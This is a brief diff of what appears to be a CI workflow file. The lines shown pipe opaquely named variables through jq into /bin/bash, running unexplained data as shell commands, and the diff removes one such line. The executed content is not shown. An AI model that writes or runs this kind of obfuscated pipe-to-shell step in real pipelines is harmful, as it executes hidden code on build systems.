@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$m6209" | jq -r .p7 | /bin/bash
           echo $fq7 | jq -r .kan76764 | /bin/bash
           printf '%s' "$h3675" | jq -r .eh10463 | /bin/bash
-          printf '%s' "$mhm988" | jq -r .tih1371 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
